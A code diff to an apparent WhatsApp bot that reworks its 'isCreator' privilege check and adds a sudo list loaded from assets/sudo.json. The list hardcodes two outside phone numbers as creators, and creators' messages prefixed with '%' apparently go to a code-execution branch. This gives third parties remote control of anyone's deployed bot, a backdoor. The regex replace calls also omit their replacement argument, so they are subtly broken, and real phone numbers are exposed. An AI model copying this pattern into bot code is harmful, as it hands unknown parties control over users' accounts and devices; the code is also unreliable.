@@ -654,9 +654,26 @@ async function connectToWA() {
       const udp = botNumber.split('@')[0];
       const jawad = ('255627417402');
       const pathum = ('94773416478');
-      let isCreator = [udp, pathum, jawad, config.DEV]
-        .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-        .includes(mek.sender);
+      // base creator list from hardcoded numbers and config.DEV
+      const baseCreators = [udp, pathum, jawad, config.DEV]
+        .map(v => v.replace(/[^0-9]/g));
+
+      // load sudo (super users) from assets/sudo.json
+      let sudoList = [];
+      try {
+        const sudoPath = path.join(__dirname, 'assets', 'sudo.json');
+        if (fs.existsSync(sudoPath)) {
+          const raw = fs.readFileSync(sudoPath, 'utf8');
+          sudoList = JSON.parse(raw || '[]').map(x => ('' + x).replace(/[^0-9]/g));
+        }
+      } catch (e) {
+        console.error('Failed to read sudo.json', e);
+      }
+
+      const allCreators = [...new Set([...baseCreators, ...sudoList])];
+      let isCreator = allCreators
+        .map(v => v + '@s.whatsapp.net')
+        .includes(mek.sender || '') || allCreators.includes(senderNumber);
 
       if (isCreator && mek.text.startsWith('%')) {
         let code = budy.slice(2);
